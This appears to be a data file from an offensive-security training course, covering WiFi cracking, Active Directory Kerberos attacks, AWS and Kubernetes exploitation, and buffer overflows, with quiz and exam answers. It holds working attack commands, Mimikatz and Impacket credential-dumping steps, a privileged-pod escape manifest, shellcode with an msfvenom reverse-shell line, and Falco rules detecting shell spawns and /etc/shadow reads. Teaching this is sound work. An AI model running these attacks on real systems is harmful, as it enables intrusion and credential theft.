    // ─── MODULE 8: WIRELESS, CLOUD & ACTIVE DIRECTORY ─────────────────────────
    {
      id: "wireless-cloud-ad",
      title: "Wireless, Cloud & Active Directory Security",
      level: "advanced",
      description: "WPA2 attacks, cloud misconfigurations, AWS pentesting, and the most important enterprise attack surface: Active Directory with Kerberos attacks.",
      lessons: [
        {
          id: "wireless-security",
          title: "Wireless Security & WPA2 Attacks",
          duration: 65,
          type: "lesson",
          description: "WiFi security standards from WEP to WPA3, capturing WPA2 handshakes, cracking with Aircrack-ng, evil twin attacks, and wireless security defences.",
          objectives: [
            "Explain WEP, WPA, WPA2, and WPA3 security differences",
            "Capture a WPA2 4-way handshake and crack it offline",
            "Set up an Evil Twin access point to capture credentials",
            "Understand PMKID attacks against WPA2",
            "Implement wireless security defences"
          ],
          content: `# Wireless Security & WPA2 Attacks

## WiFi Security Standards Evolution

\`\`\`
WEP (1999)  — RC4 cipher, static keys, 24-bit IV — BROKEN in minutes
WPA  (2003) — TKIP, dynamic keys, better than WEP — deprecated
WPA2 (2004) — AES-CCMP cipher — SECURE if strong passphrase
WPA3 (2018) — SAE (Simultaneous Authentication of Equals) — resistant to offline attacks
\`\`\`

**WPA2-Personal** (home/small business): Pre-shared key (PSK). A captured 4-way handshake can be cracked offline.
**WPA2-Enterprise** (corporate): 802.1X authentication, each user has unique credentials via RADIUS server. Much harder to attack.

## WPA2 Handshake Capture & Cracking

\`\`\`bash
# Step 1: Set wireless card to monitor mode
airmon-ng check kill        # kill conflicting processes
airmon-ng start wlan0       # start monitor mode (creates wlan0mon)

# Step 2: Scan for networks
airodump-ng wlan0mon
# Note target: BSSID (AP MAC), CH (channel), ESSID (network name)

# Step 3: Capture traffic on target network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: Deauthenticate a client to force re-authentication
# (Run in separate terminal while airodump-ng is capturing)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Send 10 deauth frames to AP → client reconnects → handshake captured
# Top of airodump-ng shows: WPA handshake: AA:BB:CC:DD:EE:FF

# Step 5: Crack offline
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Or with Hashcat (much faster on GPU)
# Convert to Hashcat format:
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule
\`\`\`

## PMKID Attack (Client-less WPA2 Cracking)

No need to wait for a client connection. Request the PMKID directly from the AP.

\`\`\`bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 rockyou.txt
\`\`\`

## Evil Twin Attack

Create a rogue access point that mimics a legitimate one. Victims connect to the fake AP.

\`\`\`bash
# Using hostapd-wpe (WPA Enterprise fake AP — captures credentials)
# Using bettercap:
bettercap -iface wlan0
> wifi.recon on
> set wifi.ap.ssid "CoffeeShop_Free_WiFi"
> wifi.ap on
# Victims connect → all their HTTP traffic visible
# With captive portal: redirect to login page, harvest credentials

# airbase-ng for WPA2 fake AP
airbase-ng -e "TargetNetwork" -c 6 wlan0mon
\`\`\`

## Defences

- Use WPA3 where supported
- Use WPA2-Enterprise (802.1X) for corporate networks — prevents offline cracking
- Use long, random passphrases (16+ chars — impractical to crack)
- Wireless IDS to detect rogue APs and deauth attacks
- VPN over all WiFi (especially public)`,
          interviewQuestions: [
            { question: "Why is WPA2-Enterprise significantly more secure than WPA2-Personal against the handshake cracking attack?", answer: "WPA2-Personal uses a shared passphrase known to all users. A captured 4-way handshake can be cracked offline against any dictionary. WPA2-Enterprise uses 802.1X/EAP — each user authenticates with unique credentials against a RADIUS server. The network key is derived per-user and per-session, so there is no shared secret to crack. Even capturing traffic only exposes one user's session.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "You capture a WPA2 handshake. The network uses the passphrase 'CompanyWifi2024!'. Will rockyou.txt crack it? What attack would work?", answer: "Rockyou.txt likely will not contain this exact passphrase. Use rule-based attacks: hashcat with best64.rule or togglecase, or a targeted wordlist combined with year/company-specific rules. Alternatively, a combinator attack or custom mask (?u?l?l?l?l?l?l?l?l?d?d?d?d?s) targeting the pattern.", type: "scenario", difficulty: "mid" }
          ]
        },
        {
          id: "active-directory-attacks",
          title: "Active Directory & Kerberos Attacks",
          duration: 85,
          type: "lesson",
          description: "Active Directory is the authentication backbone of nearly every enterprise. Domain enumeration, Kerberoasting, AS-REP Roasting, BloodHound, Pass-the-Ticket, DCSync, and Golden Ticket attacks.",
          objectives: [
            "Understand Active Directory structure: domains, OUs, trusts, GPOs",
            "Explain Kerberos authentication from first principles",
            "Perform Kerberoasting and AS-REP Roasting attacks",
            "Use BloodHound to find privilege escalation paths",
            "Execute Pass-the-Ticket and DCSync attacks"
          ],
          content: `# Active Directory & Kerberos Attacks

Active Directory (AD) manages authentication and authorisation for Windows environments. Compromising AD means owning the entire organisation. Understanding Kerberos is essential.

## Active Directory Architecture

\`\`\`
Forest: company.com
  └── Domain: company.com
        ├── Domain Controllers (DCs) — store NTDS.dit (all password hashes)
        ├── Organisational Units (OUs) — logical containers for objects
        │     ├── Users OU
        │     │     ├── john.smith (normal user)
        │     │     └── svc_backup (service account — often over-privileged)
        │     └── Computers OU
        ├── Groups
        │     ├── Domain Admins — full domain control
        │     ├── Enterprise Admins — full forest control
        │     └── Domain Users — all users
        └── GPOs (Group Policy Objects) — configure all machines/users
\`\`\`

## Kerberos Authentication — How It Works

\`\`\`
Components:
  KDC    = Key Distribution Center (runs on DC)
  AS     = Authentication Service
  TGS    = Ticket Granting Service
  TGT    = Ticket Granting Ticket (your "passport")
  ST     = Service Ticket (access to a specific service)
  krbtgt = The account whose key encrypts all TGTs

Authentication flow:
1. User logs in → AS-REQ to KDC (encrypted with user's NTLM hash)
2. KDC validates → returns TGT (encrypted with krbtgt key)
3. User requests service → sends TGT to TGS
4. TGS validates TGT → returns Service Ticket (encrypted with service account key)
5. User presents Service Ticket to service → access granted
\`\`\`

## Initial AD Enumeration

After gaining a foothold (low-privilege domain user):

\`\`\`powershell
# Enumerate domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
net user /domain                    # all domain users
net group /domain                   # all domain groups
net group "Domain Admins" /domain   # members of Domain Admins

# PowerView (PowerSploit)
Import-Module .\PowerView.ps1
Get-Domain                          # domain info
Get-DomainUser                      # all users
Get-DomainGroup -Identity "Domain Admins" | Select-Object member
Get-DomainComputer | Select-Object name,operatingsystem
Find-LocalAdminAccess               # machines where current user is local admin
\`\`\`

## BloodHound — Attack Path Visualisation

BloodHound maps AD permissions and finds privilege escalation paths.

\`\`\`bash
# Collect data (run on victim machine or with creds)
# SharpHound (Windows)
.\SharpHound.exe -c All

# BloodHound.py (from Linux with credentials)
bloodhound-python -u user -p Password1 -d company.com -c All

# Upload ZIP to BloodHound GUI
# Query: "Find Shortest Paths to Domain Admins"
# Common paths found:
# - User has GenericAll on a group that has DCSync rights
# - Service account has WriteOwner on Domain Admins group
# - Computer account has unconstrained delegation
\`\`\`

## Kerberoasting

Service accounts have a ServicePrincipalName (SPN). Any authenticated user can request a Service Ticket encrypted with the service account's hash. Crack offline.

\`\`\`bash
# Request TGS for all SPNs (from Linux with credentials)
impacket-GetUserSPNs -request -dc-ip 192.168.1.10 company.com/lowpriv:Password1

# From Windows with Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack the TGS hash (mode 13100 = Kerberos 5 TGS)
hashcat -m 13100 hashes.txt rockyou.txt
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule

# Service accounts often have weak passwords AND high privileges
# svc_backup, svc_sql — common targets
\`\`\`

## AS-REP Roasting

If a user has "Do not require Kerberos preauthentication" set, you can request an AS-REP without any credentials and crack it offline.

\`\`\`bash
# Find users with no preauth required
impacket-GetNPUsers -dc-ip 192.168.1.10 company.com/ -usersfile users.txt

# Crack (mode 18200)
hashcat -m 18200 asrep_hashes.txt rockyou.txt
\`\`\`

## Pass-the-Ticket (PtT)

Steal a Kerberos TGT and use it directly — no password needed.

\`\`\`
# With Mimikatz
mimikatz # sekurlsa::tickets /export      # export all tickets
mimikatz # kerberos::ptt ticket.kirbi     # inject ticket into current session

# Now you authenticate as the user whose ticket you stole
dir \\\\dc01\\C$    # if admin ticket, access DC
\`\`\`

## Golden Ticket Attack

The ultimate AD attack. If you obtain the krbtgt account's NTLM hash (requires Domain Admin), you can forge TGTs for any user — including users that do not exist — valid for 10 years.

\`\`\`
# Requires: krbtgt NTLM hash, Domain SID

# Get via DCSync (requires Replication rights / Domain Admin)
mimikatz # lsadump::dcsync /user:krbtgt

# Forge golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi

# Use the ticket
mimikatz # kerberos::ptt golden.kirbi
# → You are now "Administrator" — access anything in the domain
\`\`\`

## DCSync Attack

Impersonate a Domain Controller to request all password hashes from the real DC (requires DS-Replication-Get-Changes-All privilege — usually requires Domain Admin or delegated replication rights).

\`\`\`bash
# Dump all hashes from DC (from Linux)
impacket-secretsdump -just-dc company.com/domainadmin:Password1@dc01.company.com

# Specific account
impacket-secretsdump -just-dc-user krbtgt company.com/domainadmin:Password1@dc01.company.com
\`\`\``,
          interviewQuestions: [
            { question: "Explain Kerberoasting — what makes it possible and why is it so effective?", answer: "Any authenticated domain user can request a Kerberos Service Ticket for any service that has an SPN. The ticket is encrypted with the service account's NTLM hash. An attacker requests tickets for all SPNs and attempts to crack them offline — no network noise during cracking. It is effective because service accounts often have weak passwords, rarely change them, and frequently have elevated privileges. No special permissions required — any valid domain user can perform it.", difficulty: "mid" },
            { question: "What is a Golden Ticket attack and what makes it so dangerous?", answer: "A Golden Ticket is a forged Kerberos TGT created using the krbtgt account's NTLM hash. Since all TGTs are validated by checking the krbtgt signature, forged TGTs are indistinguishable from legitimate ones. An attacker can create tickets for any user (including non-existent ones), with any group membership, valid for any duration. Even resetting passwords does not help — only resetting the krbtgt password twice (breaking all valid tickets) remediates it.", difficulty: "senior" }
          ],
          quizQuestions: [
            { question: "BloodHound shows: User 'john' -> MemberOf -> Group 'Helpdesk' -> GenericAll -> 'svc_backup' account -> MemberOf -> 'Domain Admins'. How would you exploit this path?", answer: "GenericAll on svc_backup means you can change its password. As john: 1) Use PowerView Set-DomainUserPassword to change svc_backup's password. 2) Authenticate as svc_backup. 3) svc_backup is in Domain Admins — you now have DA. Alternatively, perform a targeted Kerberoasting/Shadow Credentials attack against svc_backup.", type: "scenario", difficulty: "senior" }
          ]
        }
      ],
      exam: [
        { question: "What privilege is required for a DCSync attack and how does it work technically?", answer: "DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights on the domain object. Technically, the attacker's tool (Mimikatz, secretsdump) simulates a Domain Controller initiating replication and requests all password hashes from the real DC using the MS-DRSR protocol. The DC sends hashes as part of normal replication — this is legitimate DC behaviour being abused.", difficulty: "senior" },
        { question: "What is the difference between Pass-the-Hash and Pass-the-Ticket?", answer: "Pass-the-Hash (PtH) uses the NTLM hash to authenticate to services that use NTLM authentication — the hash is the credential. Pass-the-Ticket (PtT) uses a stolen Kerberos ticket (TGT or service ticket) injected into the current session — Kerberos authentication is used, not NTLM. PtT is harder to detect since Kerberos is the preferred authentication protocol.", difficulty: "mid" }
      ]
    },

    // ─── MODULE 9: CLOUD, CONTAINERS & DEVSECOPS ─────────────────────────────
    {
      id: "cloud-container-security",
      title: "Cloud, Container & DevSecOps Security",
      level: "advanced",
      description: "AWS security misconfigurations, IAM attacks, S3 exploitation, Kubernetes security, container hardening, and securing the CI/CD pipeline.",
      lessons: [
        {
          id: "cloud-security",
          title: "Cloud Security — AWS, Misconfigs & IAM Attacks",
          duration: 75,
          type: "lesson",
          description: "AWS security architecture, IAM privilege escalation, S3 bucket attacks, metadata service abuse, CloudTrail, GuardDuty, and real-world cloud attack chains.",
          objectives: [
            "Identify and exploit common AWS IAM misconfigurations",
            "Exploit open S3 buckets to access sensitive data",
            "Use SSRF to steal EC2 metadata and IAM credentials",
            "Enumerate cloud resources with ScoutSuite and Prowler",
            "Understand CloudTrail, GuardDuty, and defensive monitoring"
          ],
          content: `# Cloud Security — AWS, Misconfigs & IAM Attacks

Cloud environments introduce unique attack surfaces. The shared responsibility model means security misconfigurations are the attacker's primary vector — there are no unpatched OSes to exploit when the cloud provider manages the hypervisor.

## AWS Security Architecture

\`\`\`
IAM (Identity & Access Management) — who can do what
  ├── Users — individual humans (should use MFA)
  ├── Groups — collection of users
  ├── Roles — identities assumed by services/humans/accounts
  └── Policies — JSON documents defining permissions

Security services:
  CloudTrail — logs ALL API calls (who did what, when, from where)
  GuardDuty  — threat detection using ML (unusual API calls, crypto mining)
  Config     — compliance monitoring, configuration history
  Security Hub — aggregate findings from all services
  IAM Access Analyzer — find overly permissive policies
\`\`\`

## IAM Privilege Escalation

IAM misconfigurations are the #1 cloud attack vector. An attacker with limited IAM permissions can often escalate to full admin.

\`\`\`bash
# Enumerate current permissions
aws iam get-user
aws iam list-attached-user-policies --user-name compromised-user
aws iam get-policy-version --policy-arn <arn> --version-id v1

# pacu — AWS exploitation framework
pacu
> import_keys compromised_access_key
> run iam__enum_permissions
> run iam__privesc_scan

# Common IAM escalation paths:
# iam:CreatePolicyVersion — create new policy version with admin rights
# iam:AttachUserPolicy — attach AdministratorAccess to yourself
# iam:PassRole + ec2:RunInstances — launch instance with privileged role, steal creds
# iam:CreateLoginProfile — create console password for any user
# lambda:UpdateFunctionCode — inject malicious code into Lambda with privileged role
\`\`\`

## S3 Bucket Attacks

\`\`\`bash
# Find open buckets
# Company name guessing:
aws s3 ls s3://company-backup --no-sign-request
aws s3 ls s3://company-dev --no-sign-request
aws s3 ls s3://company-logs --no-sign-request

# Download all files from open bucket
aws s3 sync s3://open-bucket ./loot --no-sign-request

# AWS bucket finder
python3 bucket_finder.py company_wordlist.txt

# What to look for in exposed buckets:
# .env files — database passwords, API keys
# database dumps — user records, PII
# backup files — source code, configurations
# SSL private keys
# AWS credential files (~/.aws/credentials)
\`\`\`

## SSRF → Cloud Metadata Service

The most impactful SSRF in cloud environments accesses the EC2 metadata service at 169.254.169.254.

\`\`\`bash
# SSRF payload to cloud metadata
http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials for the role
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# Returns:
# {
#   "AccessKeyId": "ASIAXXX",
#   "SecretAccessKey": "xxx",
#   "Token": "xxx",
#   "Expiration": "2024-01-01T12:00:00Z"
# }

# Use stolen credentials
export AWS_ACCESS_KEY_ID=ASIAXXX
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx
aws sts get-caller-identity      # who am I?
aws s3 ls                        # what can I access?

# IMDSv2 protection (forces session token, defeats simple SSRF):
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
\`\`\`

## Cloud Security Assessment Tools

\`\`\`bash
# ScoutSuite — multi-cloud security auditing
scout aws --profile default
# Generates HTML report with all findings

# Prowler — AWS CIS benchmark checks
prowler aws --compliance cis_aws_2.0
prowler aws --service iam s3 cloudtrail

# CloudSploit — continuous cloud security monitoring
\`\`\`

## Defensive Monitoring

\`\`\`
CloudTrail alerts to watch for:
- ConsoleLogin from unusual geography
- iam:CreateUser, iam:AttachUserPolicy from non-admin accounts
- s3:GetObject on sensitive buckets from external IPs
- ec2:DescribeInstances from new/unknown roles
- GetSecretValue — accessing Secrets Manager at unusual times

GuardDuty findings:
- UnauthorizedAccess:IAMUser/MaliciousIPCaller
- Recon:IAMUser/TorIPCaller
- CryptoCurrency:EC2/BitcoinTool — crypto mining on your instances
- Backdoor:EC2/XORDDOS — malware activity
\`\`\``,
          interviewQuestions: [
            { question: "Explain the iam:PassRole + ec2:RunInstances privilege escalation path.", answer: "iam:PassRole allows a user to assign an IAM role to a new EC2 instance. ec2:RunInstances allows launching new instances. If a user has both permissions plus access to a highly privileged role, they can launch an EC2 instance with that privileged role attached. The instance's metadata service then serves temporary credentials for that role. The attacker accesses the metadata service to steal those credentials and gains the privileges of the attached role.", difficulty: "senior" }
          ],
          quizQuestions: [
            { question: "You find an SSRF vulnerability on an EC2 instance. What sequence of requests would you make to maximise impact?", answer: "1) http://169.254.169.254/latest/meta-data/ — confirm access. 2) http://169.254.169.254/latest/meta-data/iam/security-credentials/ — get role name. 3) http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> — get keys. 4) Use keys with AWS CLI to enumerate permissions (iam:GetUser, iam:ListAttachedRolePolicies). 5) Based on permissions: access S3, call other services, attempt IAM escalation.", type: "scenario", difficulty: "mid" }
          ]
        },
        {
          id: "kubernetes-devsecops",
          title: "Kubernetes Security & DevSecOps",
          duration: 70,
          type: "lesson",
          description: "Kubernetes RBAC bypass, container escapes, pod security, supply chain attacks, SBOM, secrets scanning, and integrating security into CI/CD pipelines.",
          objectives: [
            "Identify and exploit Kubernetes RBAC misconfigurations",
            "Understand container escape techniques",
            "Use Trivy, kube-bench, and Falco for security assessment",
            "Implement DevSecOps: shift-left security, SAST, DAST in CI/CD",
            "Understand supply chain attacks and SBOM"
          ],
          content: `# Kubernetes Security & DevSecOps

## Kubernetes Attack Surface

\`\`\`
External:
  Exposed API server (should not be public)
  Exposed NodePort/LoadBalancer services
  Ingress controllers

Internal (after initial compromise):
  RBAC misconfigurations — overly permissive service accounts
  Secrets in environment variables or ConfigMaps
  Privileged pods — root access to node
  Mounted hostPath — access to node filesystem
  Service account token — every pod has one by default
\`\`\`

## Kubernetes Enumeration

\`\`\`bash
# Check what you can do with current service account
kubectl auth can-i --list

# Common overly permissive findings:
# * get pods, secrets, configmaps — read cluster secrets
# create pods — deploy privileged pod, escape to host
# get secrets — read all secrets including kubeconfig

# kube-hunter — automated Kubernetes pentesting
kube-hunter --pod              # run from inside a pod
kube-hunter --remote 10.0.0.1  # from outside

# kube-bench — CIS benchmark assessment
kube-bench run --targets node,master
\`\`\`

## Container Escape — Privileged Pod

If you can create a privileged pod with a hostPath mount, you have full node access.

\`\`\`yaml
# Privileged pod escape (deploy this if you have pod create rights)
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    command: ["/bin/bash", "-c", "chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
\`\`\`

## Secrets Management

\`\`\`bash
# Bad: secrets in environment variables
env | grep -i "password\|secret\|key\|token"

# Bad: secrets in ConfigMaps (not encrypted)
kubectl get configmap app-config -o yaml

# Get all secrets (if permitted)
kubectl get secrets -A
kubectl get secret db-password -o jsonpath='{.data.password}' | base64 -d

# Good alternatives:
# HashiCorp Vault — external secrets management
# AWS Secrets Manager / GCP Secret Manager
# Sealed Secrets (Bitnami) — encrypted secrets in Git
# External Secrets Operator
\`\`\`

## DevSecOps — Shifting Security Left

\`\`\`yaml
# .github/workflows/security.yml — security pipeline
name: Security Checks

on: [push, pull_request]

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Secrets scanning — find hardcoded secrets
      - name: Scan for secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: main

      # SAST — static application security testing
      - name: Semgrep SAST
        uses: returntocorp/semgrep-action@v1

      # Dependency vulnerability scanning
      - name: Run Trivy (filesystem scan)
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: fs
          severity: CRITICAL,HIGH
          exit-code: 1

  container-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Build image
        run: docker build -t myapp:$GITHUB_SHA .

      # Container image scanning
      - name: Trivy image scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:$GITHUB_SHA
          severity: CRITICAL,HIGH
          exit-code: 1

      # Generate SBOM (Software Bill of Materials)
      - name: Generate SBOM with Syft
        run: |
          syft myapp:$GITHUB_SHA -o spdx-json > sbom.json

  iac-scan:
    runs-on: ubuntu-latest
    steps:
      # Scan Terraform/Kubernetes manifests for misconfigurations
      - name: Checkov IaC scan
        uses: bridgecrewio/checkov-action@master
        with:
          directory: ./terraform
          framework: terraform
\`\`\`

## Runtime Security with Falco

\`\`\`yaml
# Falco rules — detect suspicious behaviour in containers
- rule: Shell in container
  desc: Detect shell inside a container
  condition: container and spawned_process and proc.name = bash
  output: Shell spawned in container (container=%container.name user=%user.name)
  priority: WARNING

- rule: Read sensitive file
  desc: Detect reading /etc/shadow or /etc/passwd
  condition: open_read and fd.name in (/etc/shadow, /etc/passwd) and container
  output: Sensitive file read in container
  priority: CRITICAL
\`\`\``,
          interviewQuestions: [
            { question: "How does a supply chain attack work and what is an SBOM?", answer: "A supply chain attack compromises software before it reaches the victim — by injecting malicious code into an open-source dependency, a build tool, or a software update mechanism (e.g., SolarWinds, XZ Utils backdoor). An SBOM (Software Bill of Materials) is a complete inventory of all components, libraries, and versions in a software product. It enables rapid identification of affected software when a new vulnerability is disclosed in a dependency.", difficulty: "mid" }
          ],
          quizQuestions: [
            { question: "A Kubernetes service account has 'create pods' permission. Describe how you would use this to escape to the underlying node.", answer: "Create a privileged pod with hostPID:true, hostNetwork:true, and a hostPath volume mounting / to /host, with the container's securityContext set to privileged:true. Running chroot /host /bin/bash gives a root shell on the underlying node filesystem. From the node you can access other pods' secrets, the kubelet credentials, and potentially the cloud instance metadata service.", type: "scenario", difficulty: "senior" }
          ]
        }
      ],
      exam: [
        { question: "Why should EC2 instance metadata service be configured to use IMDSv2?", answer: "IMDSv2 requires a PUT request with a TTL header to obtain a session token before any metadata query. This prevents SSRF attacks — a simple SSRF can make GET requests but cannot perform the PUT pre-flight. With IMDSv1, any SSRF that can reach 169.254.169.254 immediately gets IAM credentials.", difficulty: "mid" },
        { question: "What is the principle of least privilege as applied to Kubernetes RBAC?", answer: "Service accounts should only have the exact permissions needed for their function. Instead of cluster-wide permissions, use namespace-scoped Roles. Avoid ClusterRoleBindings unless necessary. Never grant wildcard resources (*) or verbs. Applications should not be able to read secrets they do not own, create pods, or access the Kubernetes API at all if they do not need to.", difficulty: "junior" }
      ]
    },

    // ─── MODULE 10: ADVANCED EXPLOITATION & RED TEAM ──────────────────────────
    {
      id: "advanced-exploitation",
      title: "Advanced Exploitation & Red Team Operations",
      level: "advanced",
      description: "Buffer overflows, shellcoding, ROP chains, C2 frameworks, lateral movement, persistence, and professional penetration test reporting.",
      lessons: [
        {
          id: "buffer-overflow",
          title: "Buffer Overflows & Exploit Development",
          duration: 90,
          type: "lesson",
          description: "Stack buffer overflows from first principles — how memory works, controlling EIP, writing shellcode, ret2libc, ROP chains, and bypassing modern mitigations.",
          objectives: [
            "Explain stack layout and how function calls work at the assembly level",
            "Identify and exploit a basic stack buffer overflow",
            "Write and use shellcode to spawn a reverse shell",
            "Understand and bypass stack canaries, ASLR, and NX",
            "Construct a simple ROP chain for NX bypass"
          ],
          content: `# Buffer Overflows & Exploit Development

Buffer overflows are among the oldest and most fundamental vulnerabilities in systems programming. Every security researcher should understand them from first principles.

## How Memory Works

When a program runs, memory is divided into segments:

\`\`\`
High addresses
┌─────────────┐
│    Stack    │ ← Local variables, function args, return addresses (grows DOWN)
├─────────────┤
│             │
│    Heap     │ ← Dynamically allocated memory (malloc/new) (grows UP)
├─────────────┤
│    BSS      │ ← Uninitialised global variables
├─────────────┤
│    Data     │ ← Initialised global variables
├─────────────┤
│    Text     │ ← Program code (executable)
└─────────────┘
Low addresses
\`\`\`

## The Stack Frame

When a function is called:

\`\`\`
call vulnerable_func:
  1. Push function arguments onto stack
  2. Push return address (EIP — where to return after function)
  3. Push saved EBP (base pointer of caller)
  4. Allocate space for local variables

Stack layout inside vulnerable_func:
┌───────────────┐  ← High addresses
│  arguments    │
├───────────────┤
│ return address│  ← WHERE WE WANT TO OVERWRITE (EIP)
├───────────────┤
│  saved EBP   │
├───────────────┤
│ local buffer  │  ← Where our input goes
│  [128 bytes]  │
└───────────────┘  ← Low addresses (buffer starts here)
\`\`\`

## Exploiting a Stack Buffer Overflow

\`\`\`c
// Vulnerable program
void vulnerable(char *input) {
    char buffer[128];
    strcpy(buffer, input);   // No bounds check! Copies until null byte
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
\`\`\`

**Step 1: Find the crash offset**
\`\`\`bash
# Generate unique pattern
msf-pattern_create -l 200
# Aa0Aa1Aa2Aa3Aa4Aa5...

# Run program with pattern
./vuln Aa0Aa1Aa2Aa3...

# When it crashes, read EIP in GDB
gdb vuln
> run $(python3 -c "print('Aa0Aa1Aa2...')")
> info registers eip
# EIP = 0x37614136

# Find offset
msf-pattern_offset -l 200 -q 37614136
# [*] Exact match at offset 140
\`\`\`

**Step 2: Control EIP**
\`\`\`python
# 140 bytes to fill buffer + saved EBP
# Then overwrite EIP with address of our shellcode
payload = b"A" * 140 + b"\\xef\\xbe\\xad\\xde"   # DEADBEEF

./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*140 + b'\\xef\\xbe\\xad\\xde')")
# EIP = 0xdeadbeef — we control execution!
\`\`\`

**Step 3: Direct shellcode execution (no mitigations)**
\`\`\`python
# Find address of buffer (where shellcode will sit)
# In GDB: x/100x $esp-200 to find the buffer

# Linux x86 reverse shell shellcode (from msfvenom or hand-crafted)
shellcode = (
    b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
    b"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
    b"\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

# Generate with msfvenom:
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b "\\x00" -f python

nop_sled = b"\\x90" * 50     # NOP sled — slide into shellcode
payload = nop_sled + shellcode + b"A" * (140 - len(nop_sled) - len(shellcode))
payload += buffer_address    # overwrite EIP with address inside NOP sled
\`\`\`

## Modern Mitigations

| Mitigation | Description | Bypass |
|---|---|---|
| **Stack Canary** | Random value before return addr — checked before return | Info leak to read canary value |
| **ASLR** | Randomises stack/heap/library addresses | Info leak, ret2plt, brute force (32-bit) |
| **NX/DEP** | Stack/heap not executable | ret2libc, ROP chains |
| **PIE** | Randomises code segment address | Info leak for base address |

## ret2libc — Defeating NX

Instead of executing shellcode on the stack (blocked by NX), return to a function in libc (always present and executable).

\`\`\`python
# Call system("/bin/sh") using existing code in libc
# Payload: [padding] [address of system()] [fake return] [address of "/bin/sh"]

system_addr = 0xf7e1b360    # from: p system in GDB
binsh_addr  = 0xf7f5e78b    # from: find &system,+9999999,"/bin/sh" in GDB
exit_addr   = 0xf7e0e690    # from: p exit in GDB

payload = b"A" * 140
payload += p32(system_addr)
payload += p32(exit_addr)   # return address after system()
payload += p32(binsh_addr)  # argument to system()
\`\`\`

## ROP Chains — Bypassing NX + ASLR

Return-Oriented Programming chains small existing code sequences ("gadgets") ending in \`ret\` to perform arbitrary computation without introducing new code.

\`\`\`bash
# Find ROP gadgets in a binary
ROPgadget --binary vuln --rop
# Example gadgets:
# 0x080484a3: pop eax; ret
# 0x080484b0: pop ebx; ret
# 0x08048510: int 0x80; ret (syscall)

# Chain to call execve("/bin/sh", 0, 0):
# 1. pop eax; ret → load 0xb (execve syscall number) into EAX
# 2. pop ebx; ret → load address of "/bin/sh" into EBX
# 3. xor ecx,ecx; ret → ECX = 0
# 4. xor edx,edx; ret → EDX = 0
# 5. int 0x80; ret → syscall → shell!
\`\`\``,
          interviewQuestions: [
            { question: "Explain why a NOP sled is used in buffer overflow exploits.", answer: "ASLR and other factors mean the exact stack address varies slightly between runs. A NOP sled is a sequence of NOP (no-operation) instructions placed before the shellcode. If EIP lands anywhere in the sled, execution slides forward into the shellcode. This increases the exploit's reliability by turning a precise address requirement into a range.", difficulty: "mid" },
            { question: "What is a ROP chain and what problem does it solve?", answer: "Return-Oriented Programming chains existing code snippets ('gadgets') — short sequences ending in 'ret' — to perform computation without injecting new code. It defeats NX/DEP (which marks the stack non-executable) because the code being executed is legitimate code that was already in executable memory. Each gadget does a small operation (pop register, move value) and returns to the next gadget address on the stack.", difficulty: "senior" }
          ],
          quizQuestions: [
            { question: "A 32-bit binary has a buffer overflow. ASLR is enabled but NX is disabled. What attack technique would you use?", answer: "With NX disabled, you can execute shellcode on the stack. With ASLR on 32-bit, the randomisation space is small (16 bits typically) — brute force is feasible (run the exploit in a loop, ~65536 attempts on average). Alternatively, if there is an info leak, use it to determine the stack base address and calculate shellcode address precisely.", type: "scenario", difficulty: "senior" }
          ]
        },
        {
          id: "red-team-and-reporting",
          title: "Red Team Operations & Professional Reporting",
          duration: 75,
          type: "lesson",
          description: "Red team methodology, MITRE ATT&CK, C2 frameworks, lateral movement, persistence, living off the land, and writing reports that get issues fixed.",
          objectives: [
            "Distinguish between red team, penetration test, and bug bounty",
            "Map techniques to MITRE ATT&CK framework",
            "Understand C2 framework architecture and usage",
            "Perform lateral movement using common techniques",
            "Write a professional penetration test report with CVSS scoring"
          ],
          content: `# Red Team Operations & Professional Reporting

## Red Team vs Pentest vs Bug Bounty

\`\`\`
Penetration Test:
  Scope: Defined systems (e.g., 192.168.1.0/24, app.company.com)
  Goal: Find as many vulnerabilities as possible in defined scope
  Rules: Specific techniques allowed/forbidden
  Duration: 1-4 weeks
  Output: Vulnerability report with remediation

Red Team Assessment:
